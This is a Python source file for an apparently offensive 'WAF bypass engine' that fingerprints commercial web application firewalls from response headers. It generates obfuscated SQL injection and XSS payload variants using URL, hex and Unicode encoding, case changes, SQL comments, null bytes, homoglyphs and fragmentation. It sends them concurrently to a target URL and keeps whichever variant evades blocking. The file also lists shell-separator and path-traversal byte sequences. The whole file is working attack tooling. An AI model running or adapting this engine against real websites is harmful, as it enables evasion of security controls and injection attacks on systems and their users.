import base64
import urllib.parse
import random
import string
import hashlib
import itertools
import binascii
import re
import socket
import struct
import logging
from typing import List, Callable, Dict, Set, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
from collections import defaultdict

# Import enhanced components
try:
    from .waf_bypass_engine_v2 import (
        PacketFrame, TraceReport, PacketInspector, ProxyConfig, ProxySession,
        EnhancedWAFBypassEngine
    )
except ImportError:
    # Fallback if v2 not available
    PacketInspector = None
    ProxyConfig = None
    ProxySession = None
    EnhancedWAFBypassEngine = None

class WAFType(Enum):
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    F5_BIGIP = "f5_bigip"
    AKAMAI = "akamai"
    MODSECURITY = "modsecurity"
    FORTIWEB = "fortiweb"
    BARRACUDA = "barracuda"
    UNKNOWN = "unknown"

class BypassTechnique(Enum):
    ENCODING = "encoding"
    CASE_MANIPULATION = "case_manipulation"
    COMMENT_INJECTION = "comment_injection"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    CONCATENATION = "concatenation"
    UNICODE_OBFUSCATION = "unicode_obfuscation"
    POLYMORPHIC = "polymorphic"
    FRAGMENTATION = "fragmentation"
    NULL_BYTE = "null_byte"
    DELIMITER_BREAK = "delimiter_break"

@dataclass
class WAFBypassPayload:
    original_payload: str
    bypassed_payload: str
    technique: BypassTechnique
    encoding_type: Optional[str] = None
    success_probability: float = 0.5
    description: str = ""

@dataclass
class WAFDetectionResult:
    waf_detected: bool
    waf_type: WAFType
    confidence: float
    headers: Dict[str, str] = field(default_factory=dict)
    fingerprints: List[str] = field(default_factory=list)
    response_time: float = 0.0

@dataclass
class BypassTestResult:
    payload: WAFBypassPayload
    status_code: int
    response_time: float
    blocked: bool
    bypassed: bool
    response_content: str = ""
    timestamp: float = field(default_factory=time.time)
    trace_report: Optional[Any] = None  # TraceReport object
    waf_indicators: List[str] = field(default_factory=list)
    intercepted_request: Optional[Dict] = None

class IntelligentPayloadGenerator:
    """Advanced Intelligent Payload Generator with ML-inspired mutations"""
    
    def __init__(self):
        self.alphabet = string.ascii_letters + string.digits
        self.magic_bytes = [
            '%00', '%0a', '%0d', '%09', '%20', '%2e', '%2f', '%3b', '%23', '%5c', '%27',
            '%22', '\\u0000', '\u200b', '-->', '<!--', '|', '||', ';', '^', '$IFS', '%7c',
            '\x00', '\x0a', '\x0d', '\x09', '\x1a', '\x20'
        ]
        self.sep_chars = ['/', '\\', '%2f', '%5c', '//', '%2e%2e%2f', '%252e%252e%252f']
        self.unicode_homoglyphs = {
            'a': ['\u0430', '\u00e0', '\u00e1', '\u1ea1'],
            'c': ['\u0441', '\u00e7'],
            'e': ['\u0435', '\u00e8', '\u00e9', '\u1eb9'],
            'i': ['\u0456', '\u00ec', '\u00ed'],
            'o': ['\u043e', '\u00f2', '\u00f3', '\u1ecd'],
            'p': ['\u0440'],
            'x': ['\u0445'],
            's': ['\u0455', '\u015f'],
        }
        self.cache = {}
        self.success_patterns = []
    
    def generate_sql_bypass_payloads(self, base_payload: str) -> List[WAFBypassPayload]:
        """Generate SQL injection bypass payloads"""
        payloads = []
        
        payloads.extend([
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._url_encode(base_payload),
                technique=BypassTechnique.ENCODING,
                encoding_type="url",
                success_probability=0.7,
                description="URL encoding"
            ),
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._double_url_encode(base_payload),
                technique=BypassTechnique.ENCODING,
                encoding_type="double_url",
                success_probability=0.65,
                description="Double URL encoding"
            ),
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._hex_encode(base_payload),
                technique=BypassTechnique.ENCODING,
                encoding_type="hex",
                success_probability=0.6,
                description="Hex encoding"
            ),
        ])
        
        payloads.extend([
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._random_case(base_payload),
                technique=BypassTechnique.CASE_MANIPULATION,
                success_probability=0.68,
                description="Random case"
            ),
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._alternating_case(base_payload),
                technique=BypassTechnique.CASE_MANIPULATION,
                success_probability=0.63,
                description="Alternating case"
            ),
        ])
        
        payloads.extend([
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._inline_comments(base_payload),
                technique=BypassTechnique.COMMENT_INJECTION,
                success_probability=0.78,
                description="Inline SQL comments"
            ),
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._nested_comments(base_payload),
                technique=BypassTechnique.COMMENT_INJECTION,
                success_probability=0.72,
                description="Nested comments"
            ),
        ])
        
        payloads.extend([
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._whitespace_replace(base_payload),
                technique=BypassTechnique.WHITESPACE_MANIPULATION,
                success_probability=0.74,
                description="Whitespace manipulation"
            ),
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._tab_newline_mix(base_payload),
                technique=BypassTechnique.WHITESPACE_MANIPULATION,
                success_probability=0.69,
                description="Tab/newline mixing"
            ),
        ])
        
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=self._insert_null_byte(base_payload),
            technique=BypassTechnique.NULL_BYTE,
            success_probability=0.55,
            description="Null byte injection"
        ))
        
        payloads.extend([
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._polymorphic(base_payload),
                technique=BypassTechnique.POLYMORPHIC,
                success_probability=0.71,
                description=f"Polymorphic variant {i+1}"
            ) for i in range(3)
        ])
        
        return payloads
    
    def generate_xss_bypass_payloads(self, base_payload: str) -> List[WAFBypassPayload]:
        """Generate XSS bypass payloads"""
        payloads = []
        
        payloads.extend([
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._html_entity_encode(base_payload),
                technique=BypassTechnique.ENCODING,
                encoding_type="html_entity",
                success_probability=0.76,
                description="HTML entity encoding"
            ),
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._unicode_encode(base_payload),
                technique=BypassTechnique.UNICODE_OBFUSCATION,
                success_probability=0.67,
                description="Unicode encoding"
            ),
        ])
        
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=self._random_case(base_payload),
            technique=BypassTechnique.CASE_MANIPULATION,
            success_probability=0.7,
            description="Random case"
        ))
        
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=self._unicode_homoglyph_replace(base_payload),
            technique=BypassTechnique.UNICODE_OBFUSCATION,
            success_probability=0.64,
            description="Unicode homoglyphs"
        ))
        
        payloads.extend([
            WAFBypassPayload(
                original_payload=base_payload,
                bypassed_payload=self._fragment_payload(base_payload),
                technique=BypassTechnique.FRAGMENTATION,
                success_probability=0.62,
                description="Payload fragmentation"
            ),
        ])
        
        return payloads
    
    def _url_encode(self, text: str) -> str:
        return urllib.parse.quote(text)
    
    def _double_url_encode(self, text: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(text))
    
    def _hex_encode(self, text: str) -> str:
        return ''.join(f'%{ord(c):02x}' for c in text)
    
    def _html_entity_encode(self, text: str) -> str:
        return ''.join(f'&#x{ord(c):x};' for c in text)
    
    def _unicode_encode(self, text: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def _random_case(self, text: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
    
    def _alternating_case(self, text: str) -> str:
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))
    
    def _inline_comments(self, text: str) -> str:
        return text.replace(' ', '/**/').replace('=', '/**/=/**/')
    
    def _nested_comments(self, text: str) -> str:
        parts = text.split(' ')
        return '/**/'.join(parts)
    
    def _whitespace_replace(self, text: str) -> str:
        return text.replace(' ', '%09').replace(' ', '%0a')
    
    def _tab_newline_mix(self, text: str) -> str:
        replacements = ['\t', '\n', '\r', '%09', '%0a', '%0d']
        return ''.join(random.choice(replacements) if c == ' ' else c for c in text)
    
    def _insert_null_byte(self, text: str) -> str:
        if len(text) > 1:
            idx = random.randint(1, len(text) - 1)
            return text[:idx] + '%00' + text[idx:]
        return text + '%00'
    
    def _unicode_homoglyph_replace(self, text: str) -> str:
        result = []
        for c in text.lower():
            if c in self.unicode_homoglyphs:
                result.append(random.choice(self.unicode_homoglyphs[c]))
            else:
                result.append(c)
        return ''.join(result)
    
    def _fragment_payload(self, text: str) -> str:
        mid = len(text) // 2
        sep = random.choice(['%0a', '%09', '/**/', ';'])
        return text[:mid] + sep + text[mid:]
    
    def _polymorphic(self, text: str) -> str:
        return ''.join(
            random.choice([
                c,
                urllib.parse.quote(c),
                c.upper(),
                c.lower(),
                f'%{ord(c):02x}'
            ]) for c in text
        )

class WAFBypassEngine:
    """Advanced WAF Detection and Bypass Engine with Enhanced Packet Inspection"""
    
    def __init__(self, max_workers: int = 20, max_combinations: int = 3000, enable_proxy: bool = False):
        self.max_workers = max_workers
        self.max_combinations = max_combinations
        self.payload_generator = IntelligentPayloadGenerator()
        
        self.vulnerabilities = []
        self.bypass_results = []
        self.lock = threading.Lock()
        
        # Initialize enhanced components
        self.packet_inspector = PacketInspector() if PacketInspector else None
        self.proxy_config = None
        self.proxy_session = None
        
        if enable_proxy and ProxySession:
            self.proxy_config = ProxyConfig()
            self.proxy_session = ProxySession(self.proxy_config)
        
        self.trace_reports = {}
        self.intercepted_requests = []
        
        self.waf_signatures = {
            WAFType.CLOUDFLARE: ['cf-ray', 'cloudflare', '__cfduid'],
            WAFType.AWS_WAF: ['x-amzn-requestid', 'x-amz-'],
            WAFType.IMPERVA: ['x-iinfo', 'incapsula', '_incap_'],
            WAFType.F5_BIGIP: ['bigipserver', 'f5', 'x-wa-info'],
            WAFType.AKAMAI: ['akamai', 'ak-', 'akamaighost'],
            WAFType.MODSECURITY: ['mod_security', 'modsecurity'],
            WAFType.FORTIWEB: ['fortiweb', 'fortigate'],
            WAFType.BARRACUDA: ['barracuda', 'barra'],
        }
        
        self.logger = logging.getLogger('WAFBypassEngine')
    
    def detect_waf(self, response: Dict) -> WAFDetectionResult:
        """Detect WAF from response"""
        headers = response.get('headers', {})
        content = response.get('content', '').lower()
        response_time = response.get('response_time', 0)
        
        headers_str = ' '.join(f'{k}:{v}' for k, v in headers.items()).lower()
        
        detected_fingerprints = []
        detected_type = WAFType.UNKNOWN
        max_confidence = 0.0
        
        for waf_type, signatures in self.waf_signatures.items():
            matches = 0
            for sig in signatures:
                if sig in headers_str or sig in content:
                    matches += 1
                    detected_fingerprints.append(sig)
            
            if matches > 0:
                confidence = min(0.9, 0.5 + (matches * 0.2))
                if confidence > max_confidence:
                    max_confidence = confidence
                    detected_type = waf_type
        
        waf_detected = max_confidence > 0.5
        
        return WAFDetectionResult(
            waf_detected=waf_detected,
            waf_type=detected_type,
            confidence=max_confidence,
            headers=headers,
            fingerprints=detected_fingerprints,
            response_time=response_time
        )
    
    def generate_bypass_payloads(self, attack_type: str, base_payload: str) -> List[WAFBypassPayload]:
        """Generate bypass payloads based on attack type"""
        attack_type_lower = attack_type.lower()
        
        if attack_type_lower in ['sql', 'sqli', 'sql_injection']:
            return self.payload_generator.generate_sql_bypass_payloads(base_payload)
        elif attack_type_lower in ['xss', 'cross_site_scripting']:
            return self.payload_generator.generate_xss_bypass_payloads(base_payload)
        else:
            return self._generate_generic_bypass_payloads(base_payload)
    
    def _generate_generic_bypass_payloads(self, base_payload: str) -> List[WAFBypassPayload]:
        """Generate generic bypass payloads"""
        payloads = []
        
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=self.payload_generator._url_encode(base_payload),
            technique=BypassTechnique.ENCODING,
            encoding_type="url",
            success_probability=0.6,
            description="URL encoding"
        ))
        
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=self.payload_generator._random_case(base_payload),
            technique=BypassTechnique.CASE_MANIPULATION,
            success_probability=0.55,
            description="Random case"
        ))
        
        return payloads
    
    def test_bypass(self, target_url: str, payloads: List[WAFBypassPayload], 
                   session=None, param_name: str = 'test') -> List[BypassTestResult]:
        """Test bypass payloads against target"""
        if not session:
            return []
        
        results = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(
                    self._test_single_payload, 
                    target_url, payload, session, param_name
                ): payload for payload in payloads
            }
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    
                    with self.lock:
                        self.bypass_results.append(result)
        
        return results
    
    def _test_single_payload(self, url: str, payload: WAFBypassPayload, 
                            session, param_name: str) -> Optional[BypassTestResult]:
        """Test a single bypass payload"""
        try:
            test_url = f"{url}?{param_name}={payload.bypassed_payload}"
            
            start_time = time.time()
            response = session.get(test_url, timeout=10, verify=False, allow_redirects=False)
            response_time = time.time() - start_time
            
            blocked = response.status_code in [403, 406, 429, 503]
            bypassed = response.status_code == 200 and blocked == False
            
            return BypassTestResult(
                payload=payload,
                status_code=response.status_code,
                response_time=response_time,
                blocked=blocked,
                bypassed=bypassed,
                response_content=response.text[:500]
            )
        except Exception as e:
            return None
    
    def adaptive_bypass_exploit(self, target_url: str, base_payload: str, 
                               attack_type: str, session, 
                               max_trials: int = 500) -> Optional[WAFBypassPayload]:
        """Adaptive bypass with learning"""
        payloads = self.generate_bypass_payloads(attack_type, base_payload)
        
        tested = set()
        successful_payload = None
        
        for payload in payloads[:max_trials]:
            payload_hash = hashlib.md5(payload.bypassed_payload.encode()).hexdigest()
            
            if payload_hash in tested:
                continue
            
            result = self._test_single_payload(target_url, payload, session, 'test')
            
            if result and result.bypassed:
                successful_payload = payload
                break
            
            tested.add(payload_hash)
        
        return successful_payload
    
    def get_bypass_results(self) -> List[BypassTestResult]:
        """Get all bypass test results"""
        with self.lock:
            return self.bypass_results.copy()
    
    def get_successful_bypasses(self) -> List[BypassTestResult]:
        """Get only successful bypasses"""
        with self.lock:
            return [r for r in self.bypass_results if r.bypassed]
    
    def get_statistics(self) -> Dict:
        """Get bypass statistics"""
        with self.lock:
            total = len(self.bypass_results)
            if total == 0:
                return {'total': 0, 'successful': 0, 'blocked': 0, 'success_rate': 0.0}
            
            successful = sum(1 for r in self.bypass_results if r.bypassed)
            blocked = sum(1 for r in self.bypass_results if r.blocked)
            
            return {
                'total': total,
                'successful': successful,
                'blocked': blocked,
                'success_rate': (successful / total) * 100 if total > 0 else 0.0
            }
    
    def clear(self):
        """Clear all results"""
        with self.lock:
            self.vulnerabilities.clear()
            self.bypass_results.clear()
    
    # ========================================================================
    # ENHANCED PACKET INSPECTION AND PROXY SUPPORT
    # ========================================================================
    
    def enable_proxy(self, proxy_host: str, proxy_port: int, username: str = None, password: str = None):
        """Enable proxy for packet inspection and request capture"""
        if not ProxyConfig or not ProxySession:
            self.logger.warning("Proxy support not available")
            return False
        
        self.proxy_config = ProxyConfig(
            proxy_type='http',
            proxy_host=proxy_host,
            proxy_port=proxy_port,
            username=username,
            password=password
        )
        self.proxy_config.enabled = True
        self.proxy_session = ProxySession(self.proxy_config)
        self.logger.info(f"Proxy enabled: {self.proxy_config.get_proxy_url()}")
        return True
    
    def disable_proxy(self):
        """Disable proxy"""
        if self.proxy_config:
            self.proxy_config.enabled = False
            self.logger.info("Proxy disabled")
    
    def enable_packet_inspection(self):
        """Enable packet inspection mode"""
        if self.proxy_config:
            self.proxy_config.enable_intercept()
            self.logger.info("Packet inspection enabled")
        else:
            self.logger.warning("Proxy must be enabled first")
    
    def disable_packet_inspection(self):
        """Disable packet inspection mode"""
        if self.proxy_config:
            self.proxy_config.disable_intercept()
            self.logger.info("Packet inspection disabled")
    
    def get_intercepted_requests(self) -> List[Dict]:
        """Get all intercepted requests from proxy"""
        if self.proxy_config:
            return self.proxy_config.get_intercepted_requests()
        return []
    
    def export_trace_logs(self, output_file: str = None) -> Dict:
        """Export all trace logs"""
        if self.proxy_session:
            return self.proxy_session.export_traces(output_file)
        return {}
    
    def get_trace_reports(self) -> Dict:
        """Get all trace reports"""
        if self.proxy_session:
            return self.proxy_session.get_trace_reports()
        return {}
    
    def test_bypass_with_tracing(self, target_url: str, payloads: List[WAFBypassPayload], 
                                param_name: str = 'test') -> List[BypassTestResult]:
        """Test bypass payloads with packet tracing using proxy"""
        if not self.proxy_session:
            # Fallback to regular testing
            return self.test_bypass(target_url, payloads, None, param_name)
        
        results = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(
                    self._test_single_payload_with_trace,
                    target_url, payload, param_name
                ): payload for payload in payloads
            }
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    with self.lock:
                        self.bypass_results.append(result)
        
        return results
    
    def _test_single_payload_with_trace(self, url: str, payload: WAFBypassPayload, 
                                        param_name: str) -> Optional[BypassTestResult]:
        """Test single payload with packet tracing"""
        try:
            test_url = f"{url}?{param_name}={payload.bypassed_payload}"
            
            start_time = time.time()
            response = self.proxy_session.get(test_url, trace_enabled=True)
            response_time = time.time() - start_time
            
            if not response:
                return None
            
            blocked = response.status_code in [403, 406, 429, 503]
            bypassed = response.status_code == 200 and not blocked
            
            # Get trace report
            trace_reports = self.proxy_session.get_trace_reports()
            trace_report = list(trace_reports.values())[0] if trace_reports else None
            
            waf_indicators = trace_report.waf_indicators if trace_report else []
            
            result = BypassTestResult(
                payload=payload,
                status_code=response.status_code,
                response_time=response_time,
                blocked=blocked,
                bypassed=bypassed,
                response_content=response.text[:500]
            )
            
            # Add trace info if available
            if trace_report:
                result.trace_report = trace_report
                result.waf_indicators = waf_indicators
            
            return result
        except Exception as e:
            self.logger.error(f"Test failed: {str(e)}")
            return None
    
    def get_packet_statistics(self) -> Dict:
        """Get packet capture statistics"""
        if self.packet_inspector:
            stats = {
                'total_frames': len(self.packet_inspector.frames),
                'total_reports': len(self.packet_inspector.trace_reports),
                'waf_signatures_detected': 0
            }
            
            for report in self.packet_inspector.trace_reports.values():
                stats['waf_signatures_detected'] += len(report.waf_indicators)
            
            return stats
        return {}
    
    def clear_proxy_logs(self):
        """Clear proxy logs and intercepted requests"""
        if self.proxy_config:
            self.proxy_config.clear_logs()
        if self.packet_inspector:
            self.packet_inspector.trace_reports.clear()
            self.packet_inspector.frames.clear()
